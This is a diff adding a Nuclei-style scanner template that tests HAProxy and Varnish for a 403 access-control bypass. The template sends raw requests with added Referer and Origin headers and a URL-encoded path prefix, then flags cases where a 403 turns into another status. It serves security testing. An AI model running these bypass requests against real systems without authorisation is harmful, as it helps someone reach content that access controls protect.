@@ -1,0 +1,40 @@
+id: haproxy-varnish-reverse-403-bypass
+
+info:
+  name: haproxy-varnish-403-bypass
+  author: aufzayed
+  severity: info
+  description: haproxy and varnish 403 bypass
+  tags: fuzz
+
+requests:
+  - raw:
+    - |+
+      GET {{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Connection: Close
+
+    - |+
+      GET {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /%61{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+      
+    unsafe: true
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 403 && status_code_2 != 403"
+          - "status_code_1 == 403 && status_code_3 != 403"
